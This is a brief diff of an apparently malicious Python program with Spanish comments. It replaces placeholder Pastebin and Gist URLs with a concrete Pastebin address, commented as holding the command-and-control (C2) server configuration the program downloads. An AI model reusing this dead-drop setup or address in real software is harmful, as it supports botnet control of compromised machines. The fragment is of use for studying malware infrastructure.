@@ -43,8 +43,7 @@ except ImportError:
 # --- CONFIGURACIÓN DINÁMICA ---
 # URLs donde está c2_servers.json (Pastebin, Gist, etc.)
 JSON_URLS = [
-    'https://pastebin.com/raw/YOUR_PASTE_ID',  # Cambiar por tu Pastebin
-    'https://gist.githubusercontent.com/YOUR_USER/YOUR_GIST/raw/c2_servers.json',  # Cambiar por tu Gist
+    'https://pastebin.com/raw/1ftfPUa0',  # Pastebin con configuración C2
 ]
 
 # Fallback si no se puede descargar JSON
